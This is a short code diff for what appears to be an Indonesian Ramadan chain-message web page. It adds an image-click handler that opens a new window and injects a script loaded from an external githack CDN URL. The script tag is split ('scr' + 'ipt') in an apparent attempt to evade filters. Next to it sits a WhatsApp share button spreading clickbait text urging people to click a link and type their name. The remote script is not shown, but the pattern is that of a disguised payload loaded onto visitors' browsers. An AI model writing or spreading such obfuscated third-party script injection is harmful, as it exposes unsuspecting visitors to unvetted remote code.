@@ -7,7 +7,15 @@ function thumbnail() {
     document.getElementById("child").innerHTML = child[family];
 }
 
+/* img onclick */
+$(document).ready(function () {
+    $("img").click(function () {
+        var w = window.open("")
+        w.document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/chat/481f925881f92186403f4651271e50b86d984239/public/js/link.js"></scr' + 'ipt>');
+    });
+});
+
 // share
-document.getElementById('share').onclick = function () {
+document.getElementById("share").onclick = function () {
     window.open("whatsapp://send?text=*Marhaban ya Ramadhan*%0A%0A*Saya telah mencobanya.. .*%0A%0A*Klik Tulisan Biru ini dan Ketik Namamu, maka kamu akan tahu ada keajaiban didalamnya*%0A👇👇👇%0Ahttps://chat.aridjaya.com/ramadhan%0A%0A*Gak di sangka, ternyata.... .😁👍*")
 };
